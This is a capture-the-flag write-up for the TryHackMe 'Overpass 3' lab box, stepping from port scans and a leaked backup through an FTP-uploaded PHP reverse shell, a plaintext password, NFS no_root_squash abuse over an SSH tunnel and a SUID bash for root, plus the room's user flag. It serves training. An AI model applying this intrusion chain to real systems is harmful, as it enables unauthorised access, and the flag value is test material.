# Overpass 3 - Hosting
After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!
Unfortunately, they haven't learned from their past mistakes. Rumour has it, their main web server is extremely vulnerable.

Warning: This box can take around 5 minutes to boot if you're not a subscriber. As a subscriber, it will be ready much faster.

I will review writeups for this room starting from 1 week after release. Before then, please do not publish writeups. Keeping them unlisted is fine but please do not share them.

You're welcome to stream this room once writeups are approved.
Banner Image from Nastuh Abootalebi on Unsplash

## Enumeration
### Port Scanning
With nmap we can find the open ports 21, 22 and 80:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ nmap $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 12:00 EDT
Nmap scan report for 10.10.252.11
Host is up (0.47s latency).
Not shown: 922 filtered tcp ports (no-response), 75 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 84.71 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ nmap -sC -sV -oN nmap/general $IP 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 12:02 EDT
Nmap scan report for 10.10.252.11
Host is up (0.63s latency).
Not shown: 919 filtered tcp ports (no-response), 78 filtered tcp ports (host-unreach)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.24 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ nmap -p- -oN nmap/all_ports $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 12:15 EDT
Nmap scan report for 10.10.252.11
Host is up (0.038s latency).
Not shown: 65361 filtered tcp ports (no-response), 171 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 182.44 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ 
```

FTP has no critical version that we could abuse and has no anonymous login available.

### HTTP
If we connect via HTTP with the system we get the following website:
![Website](images/website.png)

There is nothing more interesting here. In the source is a comment, but this won't bring us any further:
```html
        <p>We promise a 5 nines uptime,
            <!-- 0.99999% is 5 nines, right? -->and negotiable service level agreements down to of a matter of days to keep your business
            running smoothly even when technology gets in the way.
        </p>
```

With an enumeration of the web directories, we can find a backup folder with a `backup.zip` file:
```
┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://10.10.252.11 --depth 2 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --extract-links --filter-status 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.252.11
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       40l       69w      576c http://10.10.252.11/main.css
200      GET       73l      182w     2511c http://10.10.252.11/overpass.svg
200      GET      219l     1448w   117566c http://10.10.252.11/hallway.jpg
200      GET       37l      217w     1770c http://10.10.252.11/
301      GET        7l       20w      236c http://10.10.252.11/backups => http://10.10.252.11/backups/
200      GET       68l      348w    23951c http://10.10.252.11/backups/backup.zip
[####################] - 3m    220553/220553  0s      found:6       errors:482    
[####################] - 3m    220546/220546  1390/s  http://10.10.252.11/ 
[####################] - 0s    220546/220546  1901259/s http://10.10.252.11/backups/ => Directory listing                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```

Scanning for vulnerabilities with nikto:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ nikto -h http://10.10.252.11/                                                                                                                    130 ⨯
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.252.11
+ Target Hostname:    10.10.252.11
+ Target Port:        80
+ Start Time:         2023-09-13 14:19:17 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /fRsYJEqj.php: Retrieved x-powered-by header: PHP/7.2.24.
+ Apache/2.4.37 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8880 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-09-13 14:24:59 (GMT-4) (342 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ searchsploit apache 2.4                                                                                                                            1 ⨯
```
There are some weak points like the Apache version and the allowed TRACE method, but nothing interesting for an useful exploit.

## Backup
In the `backup.zip` we find the following files:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ ls -al 
total 24
drwxr-xr-x 2 kali kali  4096 Sep 13 12:23 .
drwxr-xr-x 4 kali kali  4096 Sep 13 12:23 ..
-rw-r--r-- 1 kali kali 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
-rw------- 1 kali kali  3522 Nov  8  2020 priv.key
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ file CustomerDetails.xlsx.gpg                                                                                                                    130 ⨯
CustomerDetails.xlsx.gpg: PGP RSA encrypted session key - keyid: 9E86A1C6 3FB96335 RSA (Encrypt or Sign) 2048b .
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ file priv.key                
priv.key: PGP private key block
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ 
```
Seems like we got a private gpg key and an encrypted Excel file.

### GPG
With the private key, we can successful decrypt the provided file:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ gpg --import priv.key                                               
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ gpg --output CustomerDetails.xlsx --decrypt CustomerDetails.xlsx.gpg
gpg: Note: secret key 9E86A1C63FB96335 expired at Tue 08 Nov 2022 04:14:31 PM EST
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ file CustomerDetails.xlsx    
CustomerDetails.xlsx: Microsoft Excel 2007+
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ 
```

### Excel File
In the decrypted file, we see the following entries:
![Excel](images/excel.png)

Passwords in clear text. Let's check them.

#### SSH
A log in with those users via ssh was not successful. The server has disabled password authentication over ssh and only the user `paradox` exists:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ ssh paradox@$IP                                                                                                                                  255 ⨯
paradox@10.10.252.11: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ ssh 0day@$IP                                                                                                                                     255 ⨯
0day@10.10.252.11's password: 
Permission denied, please try again.
0day@10.10.252.11's password: 

                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ ssh muirlandoracle@$IP                                                                                                                           130 ⨯
muirlandoracle@10.10.252.11's password: 
Permission denied, please try again.
muirlandoracle@10.10.252.11's password: 

                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$                                                                                                                                                  130 ⨯
```
So let's try ftp.

#### FTP
The first user `paradox` logs into the web directory (login with the other users were unsuccessful):
```
└─$ ftp $IP            
Connected to 10.10.252.11.
220 (vsFTPd 3.0.3)
Name (10.10.252.11:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al 
229 Entering Extended Passive Mode (|||45746|)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
ftp> cd backups
250 Directory successfully changed.
ftp> ls -al 
229 Entering Extended Passive Mode (|||18764|)
150 Here comes the directory listing.
drwxr-xr-x    2 48       48             24 Nov 08  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
-rw-r--r--    1 48       48          13353 Nov 08  2020 backup.zip
226 Directory send OK.
ftp> 
ftp> ^D
221 Goodbye.
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3/backup]
└─$ 
```
If we look carefully, we notice that we have write permissions to the directory, and so we can upload any files. With the nikto scan, we also find out, that the server runs php.

With that information, we can prepare a php reverse shell, upload it to the server via ftp and execute it over http.

## Reverse Shell
We can use for example the php reverse shell from [Pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). After configuring it, we have to upload it:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ ftp $IP
Connected to 10.10.252.11.
220 (vsFTPd 3.0.3)
Name (10.10.252.11:kali): paradox
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||50870|)
150 Ok to send data.
100% |**************************************************************************************************************|  5493       11.53 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (77.08 KiB/s)
ftp> ls -al 
229 Entering Extended Passive Mode (|||12264|)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48            123 Sep 13 19:05 .
drwxrwxrwx    3 48       48            123 Sep 13 19:05 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
-rw-r--r--    1 1001     1001         5493 Sep 13 19:05 php-reverse-shell.php
226 Directory send OK.
ftp> ^D
221 Goodbye.
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$                    
```

We can know trigger the reverse shell, while listening on the local port:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ curl -X GET $IP/php-reverse-shell.php


```
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8081 
Listening on 0.0.0.0 8081
Connection received on 10.10.252.11 58324
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:28:05 up  4:07,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (869): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ ls -al 
ls -al 
total 20
drwxr-xr-x.  17 root root  244 Nov 18  2020 .
drwxr-xr-x.  17 root root  244 Nov 18  2020 ..
-rw-r--r--    1 root root    0 Nov 17  2020 .autorelabel
lrwxrwxrwx.   1 root root    7 May 11  2019 bin -> usr/bin
dr-xr-xr-x.   6 root root 4096 Nov 18  2020 boot
drwxr-xr-x   19 root root 2960 Sep 13 16:24 dev
drwxr-xr-x.  85 root root 8192 Sep 13 16:25 etc
drwxr-xr-x.   4 root root   34 Nov  8  2020 home
lrwxrwxrwx.   1 root root    7 May 11  2019 lib -> usr/lib
lrwxrwxrwx.   1 root root    9 May 11  2019 lib64 -> usr/lib64
drwxr-xr-x.   2 root root    6 May 11  2019 media
drwxr-xr-x.   2 root root    6 May 11  2019 mnt
drwxr-xr-x.   2 root root    6 May 11  2019 opt
dr-xr-xr-x  132 root root    0 Sep 13 16:20 proc
dr-x------.   3 root root  141 Nov 17  2020 root
drwxr-xr-x   25 root root  800 Sep 13 16:25 run
lrwxrwxrwx.   1 root root    8 May 11  2019 sbin -> usr/sbin
drwxr-xr-x.   2 root root    6 May 11  2019 srv
dr-xr-xr-x   13 root root    0 Sep 13 16:21 sys
drwxrwxrwt    2 root root    6 Sep 13 16:25 tmp
drwxr-xr-x.  12 root root  144 Nov  8  2020 usr
drwxr-xr-x.  21 root root 4096 Nov  8  2020 var
sh-4.4$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.4$ 
```

## Privilege Escalation
From here we can try to escalate our privileges. If we take a look at the home directories and the _/etc/passwd_, we can find the two users `james` and `paradox`:
```
sh-4.4$ ls -al /home
ls -al /home
total 0
drwxr-xr-x.  4 root    root     34 Nov  8  2020 .
drwxr-xr-x. 17 root    root    244 Nov 18  2020 ..
drwx------.  3 james   james   112 Nov 17  2020 james
drwx------.  4 paradox paradox 203 Nov 18  2020 paradox
sh-4.4$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
sssd:x:997:994:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
chrony:x:996:993::/var/lib/chrony:/sbin/nologin
rngd:x:995:992:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
james:x:1000:1000:James:/home/james:/bin/bash
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
paradox:x:1001:1001::/home/paradox:/bin/bash
sh-4.4$ 
```

We already have a password for the user `paradox`. So let's try to log in:
```
sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ su paradox
su paradox
Password: ShibesAreGreat123

[paradox@localhost /]$ id
id
uid=1001(paradox) gid=1001(paradox) groups=1001(paradox)
[paradox@localhost /]$ cd /home/paradox
cd /home/paradox
[paradox@localhost ~]$ ls -al 
ls -al 
total 56
drwx------. 4 paradox paradox   203 Nov 18  2020 .
drwxr-xr-x. 4 root    root       34 Nov  8  2020 ..
-rw-rw-r--. 1 paradox paradox 13353 Nov  8  2020 backup.zip
lrwxrwxrwx. 1 paradox paradox     9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox 10019 Nov  8  2020 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox   132 Nov  8  2020 .gnupg
-rw-------. 1 paradox paradox  3522 Nov  8  2020 priv.key
drwx------  2 paradox paradox    47 Nov 18  2020 .ssh
[paradox@localhost ~]$ 
[paradox@localhost ~]$ ls -al .ssh
ls -al .ssh
total 8
drwx------  2 paradox paradox  47 Nov 18  2020 .
drwx------. 4 paradox paradox 203 Nov 18  2020 ..
-rw-------  1 paradox paradox 583 Nov 18  2020 authorized_keys
-rw-r--r--  1 paradox paradox 583 Nov 18  2020 id_rsa.pub
[paradox@localhost ~]$
```
In the home directory of the user is nothing interesting. The files are the same files, that we already found in the _/backup_ directory.

_To get a more stable shell, we could either generate and add a ssh-key to the system or we can 'upgrade' our shell like shown [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)._

### LinPEAS
To escalate our privileges further, we can use tools like LinPEAS. We have to copy it onto the system and can run it. In the results we find the following vulnerabilities:
```
[paradox@localhost ~]$ ./linpeas.sh > linpeas.txt
[paradox@localhost ~]$ less -r linpeas.txt

[...]

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                    
/home/paradox/.local/bin:/home/paradox/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin                                                               

[...]

╔══════════╣ Analyzing NFS Exports Files (limit 70)
Connected NFS Mounts: 
nfsd /proc/fs/nfsd nfsd rw,relatime 0 0
sunrpc /var/lib/nfs/rpc_pipefs rpc_pipefs rw,relatime 0 0
-rw-r--r--. 1 root root 54 Nov 18  2020 /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)                                                                                                      

[...]

```
The PATH vector isn't needful for us, because we don't have any higher privileges, that are executing files from this PATH variable.

The second one is way more interesting. The system has a nfs share configured and exported:
```
[paradox@localhost ~]$ showmount -e
Export list for localhost.localdomain:
/home/james *
[paradox@localhost ~]$ cat /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
[paradox@localhost ~]$ 
```
The problem is, that the parameter `no_root_squash` is used. This allows, that if a root user on another system mounts this nfs share remotely, he will have full root access to the share and its file system. If the parameter is not set (this would be the default configuration), the user id 0 (root) will be mapped to the user nfsnobody. So the remote root is not able to access and create files as root (_more information can be found for example [here](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot) or [here](https://www.thegeekdiary.com/basic-nfs-security-nfs-no_root_squash-and-suid/)_).

Although the share is not restricted to any host. This tells the `*` in the exports. But as we already saw in the nmap scans, the server doesn't have any open nfs ports. To bypass that, we have to tunnel the required ports.

### Tunneling with ssh port forwarding
To tunneling the nfs port, we have to generate a ssh-key on the system and add it to the ssh-agent. If this is done, and we copied the private key to our local system, we can open a tunnel.

Nfs usually runs on port 2049, but we can also verify this on the target system:
```
[paradox@localhost ~]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100024    1   udp  37662  status
    100024    1   tcp  35365  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  59269  nlockmgr
    100021    3   udp  59269  nlockmgr
    100021    4   udp  59269  nlockmgr
    100021    1   tcp  43251  nlockmgr
    100021    3   tcp  43251  nlockmgr
    100021    4   tcp  43251  nlockmgr
[paradox@localhost ~]$ ss -ltn
State               Recv-Q               Send-Q                             Local Address:Port                              Peer Address:Port              
LISTEN              0                    64                                       0.0.0.0:43251                                  0.0.0.0:*                 
LISTEN              0                    128                                      0.0.0.0:22                                     0.0.0.0:*                 
LISTEN              0                    64                                       0.0.0.0:2049                                   0.0.0.0:*                 
LISTEN              0                    128                                      0.0.0.0:35365                                  0.0.0.0:*                 
LISTEN              0                    128                                      0.0.0.0:111                                    0.0.0.0:*                 
LISTEN              0                    128                                      0.0.0.0:20048                                  0.0.0.0:*                 
LISTEN              0                    32                                             *:21                                           *:*                 
LISTEN              0                    128                                         [::]:22                                        [::]:*                 
LISTEN              0                    64                                          [::]:2049                                      [::]:*                 
LISTEN              0                    128                                         [::]:49635                                     [::]:*                 
LISTEN              0                    64                                          [::]:35727                                     [::]:*                 
LISTEN              0                    128                                         [::]:111                                       [::]:*                 
LISTEN              0                    128                                         [::]:20048                                     [::]:*                 
LISTEN              0                    128                                            *:80                                           *:*                 
[paradox@localhost ~]$ 
```

Seems good, so let's open the tunnel:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ ssh -i id_ed25519 -fN -L 2049:localhost:2049 paradox@$IP                                                                                         255 ⨯
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ nmap -p 2049 localhost
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-14 11:04 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000081s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE
2049/tcp open  nfs

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ 
```

The ssh port forwarding was successful. Now we can mount the nfs share and can access it:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ sudo mount -t nfs localhost:/ /mnt
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ ls -al /mnt
total 56
drwx------  3 kali kali   112 Nov 17  2020 .
drwxr-xr-x 19 root root 36864 Sep  3 16:08 ..
lrwxrwxrwx  1 root root     9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 kali kali    18 Nov  8  2019 .bash_logout
-rw-r--r--  1 kali kali   141 Nov  8  2019 .bash_profile
-rw-r--r--  1 kali kali   312 Nov  8  2019 .bashrc
drwx------  2 kali kali    61 Nov  7  2020 .ssh
-rw-------  1 kali kali    38 Nov 17  2020 user.flag
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ 
```

### nfs share
The first thing, that we find in the share is the user flag:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ cat /mnt/user.flag  
thm{3693fc86661faa21f16ac9508a43e1ae}
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ 
```

The next thing that we can find the private key from the user `james`:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ ls -al /mnt/.ssh 
total 12
drwx------ 2 kali kali   61 Nov  7  2020 .
drwx------ 3 kali kali  112 Nov 17  2020 ..
-rw------- 1 kali kali  581 Nov  7  2020 authorized_keys
-rw------- 1 kali kali 2610 Nov  7  2020 id_rsa
-rw-r--r-- 1 kali kali  581 Nov  7  2020 id_rsa.pub
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ cat /mnt/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----

[...]

-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ 
```

We can copy the key to our system and login as `james`:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ cp /mnt/.ssh/id_rsa .                                   
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ ls -al          
total 48
drwxr-xr-x  4 kali kali  4096 Sep 14 11:13 .
drwxr-xr-x 21 kali kali  4096 Sep 13 11:58 ..
drwxr-xr-x  3 kali kali  4096 Sep 13 16:27 backup
-rw-r--r--  1 kali kali 13353 Sep 13 12:23 backup.zip
-rw-------  1 kali kali   419 Sep 14 09:18 id_ed25519
-rw-------  1 kali kali  2610 Sep 14 11:13 id_rsa
drwxr-xr-x  2 kali kali  4096 Sep 13 12:15 nmap
-rwx------  1 kali kali  5493 Sep 14 09:12 php-reverse-shell.php
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass3]
└─$ ssh -i id_rsa james@$IP                                 
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@localhost ~]$ 
```

### Escalate to root
At this point the `no_root_squash` comes into play. As `james` we copy the bash binary into our home, which is also the share:
```
[james@localhost ~]$ cp /bin/bash .
[james@localhost ~]$ ls -al 
total 1208
drwx------. 3 james james     124 Sep 14 16:26 .
drwxr-xr-x. 4 root  root       34 Nov  8  2020 ..
-rwxr-xr-x  1 james james 1219248 Sep 14 16:26 bash
lrwxrwxrwx. 1 root  root        9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 james james      18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 james james     141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 james james     312 Nov  8  2019 .bashrc
drwx------. 2 james james      61 Nov  8  2020 .ssh
-rw-------. 1 james james      38 Nov 17  2020 user.flag
[james@localhost ~]$ 
```

Now we take a look at the mounted share on our system as root:
```
┌──(kali㉿kali)-[~]
└─$ sudo -i                    
[sudo] password for kali: 
┌──(root💀kali)-[~]
└─# cd /mnt                                         
                                                                                                                                                           
┌──(root💀kali)-[/mnt]
└─# ls -al          
total 1248
drwx------  3 kali kali     124 Sep 14 11:26 .
drwxr-xr-x 19 root root   36864 Sep  3 16:08 ..
-rwxr-xr-x  1 kali kali 1219248 Sep 14 11:26 bash
lrwxrwxrwx  1 root root       9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--  1 kali kali      18 Nov  8  2019 .bash_logout
-rw-r--r--  1 kali kali     141 Nov  8  2019 .bash_profile
-rw-r--r--  1 kali kali     312 Nov  8  2019 .bashrc
drwx------  2 kali kali      61 Nov  7  2020 .ssh
-rw-------  1 kali kali      38 Nov 17  2020 user.flag
                                                                                                                                                           
┌──(root💀kali)-[/mnt]
└─# 
```

If we manipulate the permissions on our local system in the share as root user, it will be stored identical to the system:
```
┌──(root💀kali)-[/mnt]
└─# chown root: bash
                                                                                                                                                           
┌──(root💀kali)-[/mnt]
└─# chmod +s bash        
                                                                                                                                                           
┌──(root💀kali)-[/mnt]
└─# ls -al bash 
-rwsr-sr-x 1 root root 1219248 Sep 14 11:26 bash
                                                                                                                                                           
┌──(root💀kali)-[/mnt]
└─# 
```

This allows us finally to escalate our privileges on the target system:
```
[james@localhost ~]$ ls -al 
total 1208
drwx------. 3 james james     124 Sep 14 16:26 .
drwxr-xr-x. 4 root  root       34 Nov  8  2020 ..
-rwsr-sr-x  1 root  root  1219248 Sep 14 16:26 bash
lrwxrwxrwx. 1 root  root        9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 james james      18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 james james     141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 james james     312 Nov  8  2019 .bashrc
drwx------. 2 james james      61 Nov  8  2020 .ssh
